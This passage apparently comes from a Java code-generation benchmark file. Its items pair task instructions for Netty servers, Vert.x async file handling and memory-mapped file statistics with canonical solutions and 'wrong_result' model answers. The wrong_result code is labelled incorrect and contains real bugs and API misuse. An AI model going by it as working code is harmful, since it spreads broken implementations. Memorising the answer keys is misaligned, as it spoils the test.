writeInternal(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) {\n        ch.write(buff, position, null, new CompletionHandler<Integer, Object>() {\n            public void completed(Integer bytesWritten, Object attachment) {\n                long pos = position;\n                if (buff.hasRemaining()) {\n                    pos += bytesWritten;\n                    writeInternal(buff, pos, handler);\n                } else {\n                    context.runOnContext((v) -> {\n                        handler.handle(Future.succeededFuture());\n                    });\n                }\n            }\n\n            public void failed(Throwable exc, Object attachment) {\n                context.runOnContext((v) -> {\n                    handler.handle(Future.failedFuture(exc));\n                });\n            }\n        });\n    }\n\n    private void doRead(Buffer writeBuff, int offset, ByteBuffer buff, long position, Promise<Buffer> promise) {\n        ch.read(buff, position, null, new CompletionHandler<Integer, Object>() {\n            long pos = position;\n\n            private void done() {\n                buff.flip();\n                writeBuff.setBytes(offset, buff);\n                buff.compact();\n                promise.complete(writeBuff);\n            }\n\n            public void completed(Integer bytesRead, Object attachment) {\n                if (bytesRead == -1) {\n                    done();\n                } else if (buff.hasRemaining()) {\n                    pos += bytesRead;\n                    doRead(writeBuff, offset, buff, pos, promise);\n                } else {\n                    done();\n                }\n            }\n\n            public void failed(Throwable t, Object attachment) {\n                promise.fail(t);\n            }\n        });\n    }\n\n    private void check() {\n        if (closed) {\n            throw new IllegalStateException(\"File handle is closed\");\n        }\n    }\n\n    private void closeInternal(Promise<Void> handler) {\n        check();\n        closed = true;\n        context.<Void>executeBlockingInternal(() -> {\n            ch.close();\n            return null;\n        }).onComplete(handler);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\npublic class AsyncFileImpl implements AsyncFile {\n  private final VertxInternal vertx;\n  private final AsynchronousFileChannel ch;\n  private final ContextInternal context;\n  private volatile boolean closed = false;\n  private long writePos = 0;\n  private int readBufferSize = 8192;\n  private Handler<Buffer> handler;\n  private Handler<Void> endHandler;\n  private long readPos = 0;\n  private long readLength = Long.MAX_VALUE;\n\n  public AsyncFileImpl(VertxInternal vertx, String path, OpenOptions options, ContextInternal context) throws IOException {\n    this.vertx = vertx;\n    this.context = context;\n    Set<OpenOption> openOptions = new HashSet<>();\n    if (options.isRead()) openOptions.add(StandardOpenOption.READ);\n    if (options.isWrite()) openOptions.add(StandardOpenOption.WRITE);\n    if (options.isAppend()) openOptions.add(StandardOpenOption.APPEND);\n    if (options.isCreateNew()) openOptions.add(StandardOpenOption.CREATE_NEW);\n    if (options.isCreate()) openOptions.add(StandardOpenOption.CREATE);\n    if (options.isTruncateExisting()) openOptions.add(StandardOpenOption.TRUNCATE_EXISTING);\n    if (options.isDeleteOnClose()) openOptions.add(StandardOpenOption.DELETE_ON_CLOSE);\n    this.ch = AsynchronousFileChannel.open(Paths.get(path), openOptions.toArray(new OpenOption[0]));\n  }\n\n  public Future<Void> close() {\n    Promise<Void> promise = Promise.promise();\n    context.executeFromIO(() -> {\n      if (closed) {\n        promise.complete();\n        return;\n      }\n      closeInternal(promise);\n    });\n    return promise.future();\n  }\n\n  private void closeInternal(Promise<Void> handler) {\n    closed = true;\n    ch.close().whenComplete((result, err) -> {\n      if (err != null) {\n        handler.fail(err);\n      } else {\n        handler.complete();\n      }\n    });\n  }\n\n  public Future<Buffer> read(Buffer buffer, int offset, long position, int length) {\n    Promise<Buffer> promise = Promise.promise();\n    check();\n    ByteBuffer byteBuffer = buffer.getBytesBuffer(offset, length);\n    context.executeFromIO(() -> doRead(buffer, offset, byteBuffer, position, promise));\n    return promise.future();\n  }\n\n  private void doRead(Buffer writeBuff, int offset, ByteBuffer buff, long position, Promise<Buffer> promise) {\n    ch.read(buff, position).whenComplete((readBytes, err) -> {\n      if (err != null) {\n        promise.fail(err);\n        return;\n      }\n      if (readBytes == -1) {\n        if (endHandler != null) {\n          endHandler.handle(null);\n        }\n        promise.complete(Buffer.buffer());\n        return;\n      }\n      Buffer result = Buffer.buffer(buff.array(), 0, readBytes);\n      if (handler != null) {\n        handler.handle(result);\n      }\n      promise.complete(result);\n    });\n  }\n\n  public Future<Void> write(Buffer buffer, long position) {\n    Promise<Void> promise = Promise.promise();\n    check();\n    ByteBuffer byteBuffer = buffer.getBytesBuffer();\n    context.executeFromIO(() -> doWrite(byteBuffer, position, promise));\n    return promise.future();\n  }\n\n  private void doWrite(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) {\n    writeInternal(buff, position, handler);\n  }\n\n  private void writeInternal(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) {\n    ch.write(buff, position).whenComplete((written, err) -> {\n      if (err != null) {\n        handler.handle(Future.failedFuture(err));\n      } else {\n        handler.handle(Future.succeededFuture());\n      }\n    });\n  }\n\n  private void check() {\n    if (closed) {\n      throw new IllegalStateException(\"File is already closed\");\n    }\n  }\n}\n```"
  },
  {
    "Task_id": 186,
    "Instruction": "Task Description: Implement an abstract HTTP/2 server transport class using Java Netty framework that handles TCP communication, manages server lifecycle (start/stop), and supports SSL encryption.\n\nClass Description: AbstractHttp2ServerTransport is an abstract base class for creating HTTP/2 server transports using Netty. It manages server bootstrap configuration, event loop groups, and provides core server functionality including SSL support and connection management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging server events and errors\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for configuring and starting the server\n- bizGroup: EventLoopGroup - Event loop group for handling business logic and I/O operations\n- transportConfig: ServerTransportConfig - Configuration object containing server parameters like host, port, and various TCP options\n\nMethods:\n- AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) -> None - Constructor that initializes the transport with configuration\n- start() -> boolean - Starts the HTTP/2 server, initializes event loop groups, configures server bootstrap with TCP options and handlers, and binds to the specified host/port. Returns true if successful\n- stop() -> None - Shuts down the server gracefully, closing event loop groups and releasing resources\n- (inherited methods from ServerTransport superclass would be listed here if applicable)\n\nInput:\n- For constructor: ServerTransportConfig object containing server configuration parameters\n- For start(): None (uses internal state)\n- For stop(): None (uses internal state)\n\nOutput:\n- For start(): boolean indicating success/failure of server startup\n- For stop(): None (performs cleanup operations)",
    "Canonical_solution": "import com.alipay.sofa.rpc.core.exception.SofaRpcRuntimeException;\nimport com.alipay.sofa.rpc.log.LogCodes;\nimport com.alipay.sofa.rpc.log.Logger;\nimport com.alipay.sofa.rpc.log.LoggerFactory;\nimport com.alipay.sofa.rpc.server.http.HttpServerHandler;\nimport com.alipay.sofa.rpc.transport.ServerTransport;\nimport com.alipay.sofa.rpc.transport.ServerTransportConfig;\nimport com.alipay.sofa.rpc.transport.netty.NettyHelper;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\n\nimport java.net.InetSocketAddress;\n\npublic abstract class AbstractHttp2ServerTransport extends ServerTransport {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(AbstractHttp2ServerTransport.class);\n\n    private volatile ServerBootstrap serverBootstrap;\n    private EventLoopGroup bizGroup;\n\n    protected AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        super(transportConfig);\n    }\n\n    @Override\n    public boolean start() {\n        if (serverBootstrap != null) {\n            return true;\n        }\n        synchronized (this) {\n            if (serverBootstrap != null) {\n                return true;\n            }\n            boolean flag = false;\n            SslContext sslCtx = SslContextBuilder.build();\n\n            EventLoopGroup bossGroup = NettyHelper.getServerBossEventLoopGroup(transportConfig);\n            HttpServerHandler httpServerHandler = (HttpServerHandler) transportConfig.getServerHandler();\n            bizGroup = NettyHelper.getServerBizEventLoopGroup(transportConfig, httpServerHandler.getBizThreadPool());\n\n            serverBootstrap = new ServerBootstrap();\n            serverBootstrap.group(bossGroup, bizGroup)\n                .channel(transportConfig.isUseEpoll() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, transportConfig.getBacklog())\n                .option(ChannelOption.SO_REUSEADDR, transportConfig.isReuseAddr())\n                .option(ChannelOption.RCVBUF_ALLOCATOR, NettyHelper.getRecvByteBufAllocator())\n                .option(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.SO_KEEPALIVE, transportConfig.isKeepAlive())\n                .childOption(ChannelOption.TCP_NODELAY, transportConfig.isTcpNoDelay())\n                .childOption(ChannelOption.SO_RCVBUF, 8192 * 128)\n                .childOption(ChannelOption.SO_SNDBUF, 8192 * 128)\n                .handler(new LoggingHandler(LogLevel.DEBUG))\n                .childOption(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(\n                    transportConfig.getBufferMin(), transportConfig.getBufferMax()))\n                .childHandler(new Http2ServerChannelInitializer(bizGroup, sslCtx,\n                    httpServerHandler, transportConfig.getPayload()));\n\n            ChannelFuture future = serverBootstrap.bind(\n                new InetSocketAddress(transportConfig.getHost(), transportConfig.getPort()));\n            ChannelFuture channelFuture = future.addListener(new ChannelFutureListener() {\n                @Override\n                public void operationComplete(ChannelFuture future) throws Exception {\n                    if (future.isSuccess()) {\n                        if (LOGGER.isInfoEnabled()) {\n                            LOGGER.info(\"HTTP/2 Server bind to {}:{} success!\",\n                                transportConfig.getHost(), transportConfig.getPort());\n                        }\n                    } else {\n                        LOGGER.error(LogCodes.getLog(LogCodes.ERROR_HTTP2_BIND, transportConfig.getHost(),\n                            transportConfig.getPort()));\n                        stop();\n                    }\n                }\n            });\n\n            try {\n                channelFuture.await();\n                if (channelFuture.isSuccess()) {\n                    flag = Boolean.TRUE;\n                } else {\n                    throw new SofaRpcRuntimeException(LogCodes.getLog(LogCodes.ERROR_START_SERVER, \"HTTP/2\"),\n                        future.cause());\n                }\n            } catch (InterruptedException e) {\n                LOGGER.error(e.getMessage(), e);\n            }\n            return flag;\n        }\n    }\n\n    @Override\n    public void stop() {\n        if (LOGGER.isInfoEnabled()) {\n            LOGGER.info(\"Shutdown the SOFA RPC HTTP/2 server transport now...\");\n        }\n        NettyHelper.closeServerBossEventLoopGroup(transportConfig);\n        if (bizGroup != null) {\n            bizGroup.shutdownGracefully();\n        }\n        serverBootstrap = null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http2.Http2SecurityUtil;\nimport io.netty.handler.ssl.ApplicationProtocolConfig;\nimport io.netty.handler.ssl.ApplicationProtocolNames;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslProvider;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic abstract class AbstractHttp2ServerTransport {\n    protected final Logger LOGGER = LoggerFactory.getLogger(getClass());\n    protected final ServerBootstrap serverBootstrap;\n    protected final EventLoopGroup bizGroup;\n    protected final ServerTransportConfig transportConfig;\n    private ChannelFuture channelFuture;\n\n    public AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        this.transportConfig = transportConfig;\n        this.serverBootstrap = new ServerBootstrap();\n        this.bizGroup = new NioEventLoopGroup(transportConfig.getWorkerThreads());\n    }\n\n    public boolean start() {\n        try {\n            configureBootstrap();\n            channelFuture = serverBootstrap.bind(transportConfig.getHost(), transportConfig.getPort()).syncUninterruptibly();\n            if (channelFuture.isSuccess()) {\n                LOGGER.info(\"HTTP/2 server started on {}:{}\", transportConfig.getHost(), transportConfig.getPort());\n                return true;\n            } else {\n                LOGGER.error(\"Failed to start HTTP/2 server\");\n                return false;\n            }\n        } catch (Exception e) {\n            LOGGER.error(\"Error starting HTTP/2 server\", e);\n            stop();\n            return false;\n        }\n    }\n\n    public void stop() {\n        if (channelFuture != null) {\n            channelFuture.channel().close();\n        }\n        bizGroup.shutdownGracefully();\n        LOGGER.info(\"HTTP/2 server stopped\");\n    }\n\n    protected void configureBootstrap() throws Exception {\n        SslContext sslCtx = buildSslContext();\n\n        serverBootstrap.group(bizGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                        initHttp2Pipeline(ch.pipeline());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, transportConfig.getBacklog())\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childOption(ChannelOption.TCP_NODELAY, transportConfig.isTcpNoDelay());\n    }\n\n    protected abstract void initHttp2Pipeline(io.netty.channel.ChannelPipeline pipeline);\n\n    private SslContext buildSslContext() throws Exception {\n        return SslContextBuilder.forServer(transportConfig.getSslKeyStoreFile(),\n                transportConfig.getSslKeyStorePassword(), transportConfig.getSslKeyManagerPassword())\n                .sslProvider(SslProvider.JDK)\n                .protocols(Http2SecurityUtil.defaultClientProtocols())\n                .applicationProtocolConfig(new ApplicationProtocolConfig(\n                        ApplicationProtocolConfig.Protocol.ALPN,\n                        ApplicationProtocolConfig.SelectorFailureBehavior.FATAL,\n                        ApplicationProtocolConfig.SelectedListenerFailureBehavior.ACCEPT,\n                        ApplicationProtocolNames.HTTP_2))\n                .build();\n    }\n}\n```"
  },
  {
    "Task_id": 19,
    "Instruction": "Task Description: Implement a Java class that processes large files efficiently using memory-mapped file operations (FileChannel and MappedByteBuffer) to calculate statistics (min, max, sum, count) for numeric values associated with named fields in the file.\n\nClass Description: FileChannelProcessor is a utility class that processes large files in chunks using memory-mapped buffers, calculating statistics for named numeric values in a thread-safe manner using concurrent data structures.\n\nAttributes:\n- mins: ConcurrentHashMap<ByteBuffer, Integer> - Stores minimum values for each named field\n- maxs: ConcurrentHashMap<ByteBuffer, Integer> - Stores maximum values for each named field\n- sums: ConcurrentHashMap<ByteBuffer, Integer> - Stores sum of values for each named field\n- counts: ConcurrentHashMap<ByteBuffer, Integer> - Stores count of values for each named field\n\nMethods:\n- processChunk(MappedByteBuffer chunk, long chunkSize) -> void - Processes a memory-mapped file chunk to calculate statistics for named numeric values\n  - Input Parameters:\n    - chunk: MappedByteBuffer - Memory-mapped buffer containing file data\n    - chunkSize: long - Size of the chunk to process\n- processFile(Path filePath) -> void - Processes the entire file by dividing it into chunks and calculating statistics\n  - Input Parameters:\n    - filePath: Path - Path to the file to be processed\n  - Throws: IOException - If there are file I/O errors",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.HashMap;\nimport java.util.IntSummaryStatistics;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class FileChannelProcessor {\n\n    private static final ConcurrentHashMap<ByteBuffer, Integer> mins = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> maxs = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> sums = new ConcurrentHashMap<>();\n    private static final ConcurrentHashMap<ByteBuffer, Integer> counts = new ConcurrentHashMap<>();\n\n    public static void processChunk(MappedByteBuffer chunk, long chunkSize) {\n        chunk.load();\n        HashMap<ByteBuffer, IntSummaryStatistics> values = new HashMap<>();\n\n        long end = chunk.position() + chunkSize;\n        int value = 0;\n        byte b = 0;\n        boolean negate = false;\n        long nameStart = 0;\n        long nameEnd = 0;\n        int nameLength = 0;\n        while (chunk.position() < end) {\n            nameStart = chunk.position();\n            b = chunk.get();\n            while (b != ';') {\n                b = chunk.get();\n            }\n            nameEnd = chunk.position() - 1;\n            nameLength = (int) (nameEnd - nameStart);\n            ByteBuffer nameBuffer = ByteBuffer.allocate(nameLength);\n            chunk.get(chunk.position() - nameLength - 1, nameBuffer.array(), 0, nameLength);\n\n            value = 0;\n            b = chunk.get();\n            negate = false;\n            while (b != '\\n') {\n                if (b == '.') {\n                    b = chunk.get();\n                    continue;\n                }\n                else if (b == '-') {\n                    negate = true;\n                    b = chunk.get();\n                    continue;\n                }\n                value = value * 10 + (b - '0');\n                b = chunk.get();\n            }\n            if (negate) {\n                value = -value;\n            }\n\n            if (values.containsKey(nameBuffer)) {\n                values.get(nameBuffer).accept(value);\n            }\n            else {\n                IntSummaryStatistics stats = new IntSummaryStatistics();\n                stats.accept(value);\n                values.put(nameBuffer, stats);\n            }\n        }\n\n        for (ByteBuffer nameBfr : values.keySet()) {\n            IntSummaryStatistics stats = values.get(nameBfr);\n            mins.compute(nameBfr, (k, v) -> v == null ? stats.getMin() : Math.min(v, stats.getMin()));\n            maxs.compute(nameBfr, (k, v) -> v == null ? stats.getMax() : Math.max(v, stats.getMax()));\n            sums.compute(nameBfr, (k, v) -> v == null ? (int) stats.getSum() : (v + (int) stats.getSum()));\n            counts.compute(nameBfr, (k, v) -> v == null ? (int) stats.getCount() : (v + (int) stats.getCount()));\n        }\n    }\n\n    public static void processFile(Path filePath) throws IOException {\n        FileChannel fc = FileChannel.open(filePath);\n        long fileSize = fc.size();\n        int numProcessors = Runtime.getRuntime().availableProcessors();\n        int numChunks = numProcessors * 2000;\n        long chunkLimit = fileSize / numChunks;\n        long chunkStart = 0;\n        long chunkEnd = chunkLimit;\n        ByteBuffer bb = ByteBuffer.allocateDirect(128);\n\n        while (chunkEnd < fileSize) {\n            fc.position(chunkEnd);\n            bb.clear();\n            fc.read(bb);\n            bb.flip();\n            while (bb.get() != '\\n' && bb.position() < bb.limit()) {\n            }\n            chunkEnd = chunkEnd + bb.position();\n            if (chunkEnd > fileSize) {\n                chunkEnd = fileSize - 1;\n            }\n\n            long chunkSize = chunkEnd - chunkStart;\n            if (chunkSize < 1) {\n                break;\n            }\n\n            MappedByteBuffer chunk = fc.map(FileChannel.MapMode.READ_ONLY, chunkStart, chunkSize);\n            processChunk(chunk, chunkSize);\n            chunkStart = chunkEnd;\n            chunkEnd = chunkEnd + chunkLimit;\n            if (chunkEnd > fileSize) {\n                chunkEnd = fileSize - 1;\n            }\n        }\n        fc.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class FileChannelProcessor {\n    private final ConcurrentHashMap<ByteBuffer, Integer> mins = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> maxs = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> sums = new ConcurrentHashMap<>();\n    private final ConcurrentHashMap<ByteBuffer, Integer> counts = new ConcurrentHashMap<>();\n\n    public void processChunk(MappedByteBuffer chunk, long chunkSize) {\n        for (int i = 0; i < chunkSize; ) {\n            if (chunk.remaining() < 128) break; // Assuming fixed-size records with name (64 bytes), value (8 bytes)\n\n            ByteBuffer fieldName = ((ByteBuffer) chunk.duplicate()).slice(i, 64).slice();\n            int value = chunk.getInt(i + 64);\n\n            fieldName.flip();\n\n            mins.compute(fieldName, (k, v) -> v == null || value < v ? value : v);\n            maxs.compute(fieldName, (k, v) -> v == null || value > v ? value : v);\n            sums.compute(fieldName, (k, v) -> v == null ? value : v + value);\n            counts.compute(fieldName, (k, v) -> v == null ? 1 : v + 1);\n\n            i += 72; // 64 bytes for name, 8 bytes for integer value\n        }\n    }\n\n    public void processFile(Path filePath) throws IOException {\n        try (FileChannel fileChannel = FileChannel.open(filePath)) {\n            long fileSize = fileChannel.size();\n            long chunkSize = 1024 * 1024 * 10; // 10 MB chunks\n\n            for (long position = 0; position < fileSize; position += chunkSize) {\n                long sizeToMap = Math.min(chunkSize, fileSize - position);\n                MappedByteBuffer buffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, sizeToMap);\n                processChunk(buffer, sizeToMap);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 192,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process protocol messages.\n\nClass Description: ProtocolServer is a Netty-based TCP server implementation that listens on a specified port, handles incoming connections, and processes protocol messages using custom channel handlers. It manages server resources including event loop groups and provides graceful shutdown capabilities.\n\nAttributes:\n- acceptorEventLoopGroup: [EventLoopGroup] - Handles accepting new connections (boss group)\n- networkEventLoopGroup: [EventLoopGroup] - Handles network I/O operations (worker group)\n- eventExecutorGroup: [EventExecutorGroup] - Executes business logic handlers\n- config: [Config] - Server configuration including port number\n- applicationContext: [ApplicationContext] - Spring application context for dependency injection\n\nMethods:\n- ProtocolServer([Config] config, [ApplicationContext] applicationContext) -> [void] - Constructor that initializes event loop groups with specified configurations\n- start() -> [ChannelFuture] - Starts the server, binds to the configured port, and returns a ChannelFuture that can be used to wait for server shutdown",
    "Canonical_solution": "import com.codingapi.txlcn.protocol.config.Config;\nimport com.codingapi.txlcn.protocol.handler.ProtocolChannelHandler;\nimport com.codingapi.txlcn.protocol.handler.ProtocolChannelInitializer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.util.concurrent.EventExecutorGroup;\nimport org.springframework.context.ApplicationContext;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtocolServer {\n\n    private final EventLoopGroup acceptorEventLoopGroup;\n    private final EventLoopGroup networkEventLoopGroup;\n    private final EventExecutorGroup eventExecutorGroup;\n    private final Config config;\n    private final ApplicationContext applicationContext;\n\n    public ProtocolServer(Config config, ApplicationContext applicationContext) {\n        this.config = config;\n        this.applicationContext = applicationContext;\n        this.acceptorEventLoopGroup = new NioEventLoopGroup(1);\n        this.networkEventLoopGroup = new NioEventLoopGroup(6);\n        this.eventExecutorGroup = new NioEventLoopGroup(10);\n    }\n\n    public ChannelFuture start() throws InterruptedException {\n        int portToBind = config.getPort();\n        ProtocolChannelHandler protocolChannelHandler = new ProtocolChannelHandler(new Protocoler(config), applicationContext, config);\n        ProtocolChannelInitializer protocolChannelInitializer = new ProtocolChannelInitializer(config, protocolChannelHandler, eventExecutorGroup);\n\n        final ServerBootstrap peerBootstrap = new ServerBootstrap();\n        peerBootstrap.group(acceptorEventLoopGroup, networkEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .childHandler(protocolChannelInitializer);\n\n        final ChannelFuture bindFuture = peerBootstrap.bind(portToBind).sync();\n        if (bindFuture.isSuccess()) {\n            final Channel serverChannel = bindFuture.channel();\n            return serverChannel.closeFuture();\n        } else {\n            throw new RuntimeException(\"Server could not bind to \" + portToBind, bindFuture.cause());\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.springframework.context.ApplicationContext;\n\npublic class ProtocolServer {\n    private final EventLoopGroup acceptorEventLoopGroup;\n    private final EventLoopGroup networkEventLoopGroup;\n    private final EventExecutorGroup eventExecutorGroup;\n    private final Config config;\n    private final ApplicationContext applicationContext;\n\n    public ProtocolServer(Config config, ApplicationContext applicationContext) {\n        this.acceptorEventLoopGroup = new NioEventLoopGroup(1);\n        this.networkEventLoopGroup = new NioEventLoopGroup();\n        this.eventExecutorGroup = new DefaultEventExecutorGroup(16);\n        this.config = config;\n        this.applicationContext = applicationContext;\n    }\n\n    public ChannelFuture start() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(acceptorEventLoopGroup, networkEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(eventExecutorGroup, applicationContext.getBean(ProtocolMessageHandler.class));\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            return bootstrap.bind(config.getPort()).sync();\n        } catch (InterruptedException e) {\n            throw new RuntimeException(\"Failed to start the server\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 198,
    "Instruction": "Task Description: Implement a Netty-based TCP server acceptor class that handles MQTT protocol communication, including server initialization, configuration, and graceful shutdown.\n\nClass Description: NettyAcceptor is a server acceptor implementation that uses Netty framework to create a TCP server for MQTT protocol communication. It manages server resources, handles incoming connections, and processes MQTT messages through configured handlers.\n\nAttributes:\n- m_bossGroup: [NioEventLoopGroup] - The parent event loop group that accepts incoming connections\n- m_workerGroup: [NioEventLoopGroup] - The child event loop group that handles the traffic of accepted connections\n- channelClass: [Class<? extends ServerSocketChannel>] - The channel class implementation (NIO in this case)\n- nettySoBacklog: [int] - Maximum queue length for incoming connection indications\n- nettySoReuseaddr: [boolean] - Whether to reuse local address and port\n- nettyTcpNodelay: [boolean] - Whether to enable TCP_NODELAY (disable Nagle's algorithm)\n- nettySoKeepalive: [boolean] - Whether to enable SO_KEEPALIVE\n- nettyChannelTimeoutSeconds: [int] - Channel idle timeout in seconds\n\nMethods:\n- initialize([ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator]) -> [void] - Initializes the acceptor with MQTT processor, configuration properties, and SSL context creator\n- initializePlainTCPTransport([NettyMQTTHandler handler, IConfig props]) -> [void] - Configures and starts the plain TCP transport with MQTT-specific handlers\n- close() -> [void] - Shuts down the acceptor gracefully, releasing all resources",
    "Canonical_solution": "import io.moquette.server.ServerAcceptor;\nimport io.moquette.server.config.IConfig;\nimport io.moquette.spi.impl.ProtocolProcessor;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.mqtt.MqttDecoder;\nimport io.netty.handler.codec.mqtt.MqttEncoder;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.Future;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyAcceptor implements ServerAcceptor {\n\n    private static final Logger LOG = LoggerFactory.getLogger(NettyAcceptor.class);\n\n    private EventLoopGroup m_bossGroup;\n    private EventLoopGroup m_workerGroup;\n    private Class<? extends ServerSocketChannel> channelClass;\n    private int nettySoBacklog;\n    private boolean nettySoReuseaddr;\n    private boolean nettyTcpNodelay;\n    private boolean nettySoKeepalive;\n    private int nettyChannelTimeoutSeconds;\n\n    @Override\n    public void initialize(ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator) throws IOException {\n        LOG.info(\"Initializing Netty acceptor...\");\n\n        nettySoBacklog = Integer.parseInt(props.getProperty(BrokerConstants.NETTY_SO_BACKLOG_PROPERTY_NAME, \"128\"));\n        nettySoReuseaddr = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_SO_REUSEADDR_PROPERTY_NAME, \"true\"));\n        nettyTcpNodelay = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_TCP_NODELAY_PROPERTY_NAME, \"true\"));\n        nettySoKeepalive = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_SO_KEEPALIVE_PROPERTY_NAME, \"true\"));\n        nettyChannelTimeoutSeconds = Integer.parseInt(props.getProperty(BrokerConstants.NETTY_CHANNEL_TIMEOUT_SECONDS_PROPERTY_NAME, \"10\"));\n\n        LOG.info(\"Netty is using NIO\");\n        m_bossGroup = new NioEventLoopGroup(1);\n        m_workerGroup = new NioEventLoopGroup();\n        channelClass = NioServerSocketChannel.class;\n\n        final NettyMQTTHandler mqttHandler = new NettyMQTTHandler(processor);\n        initializePlainTCPTransport(mqttHandler, props);\n    }\n\n    private void initializePlainTCPTransport(final NettyMQTTHandler handler, IConfig props) throws IOException {\n        LOG.info(\"Configuring TCP MQTT transport\");\n        final MoquetteIdleTimeoutHandler timeoutHandler = new MoquetteIdleTimeoutHandler();\n        String host = props.getProperty(BrokerConstants.HOST_PROPERTY_NAME, \"0.0.0.0\");\n        String tcpPortProp = props.getProperty(PORT_PROPERTY_NAME, DISABLED_PORT_BIND);\n        if (DISABLED_PORT_BIND.equals(tcpPortProp)) {\n            LOG.info(\"TCP MQTT will be disabled\");\n            return;\n        }\n        int port = Integer.parseInt(tcpPortProp);\n\n        ServerBootstrap b = new 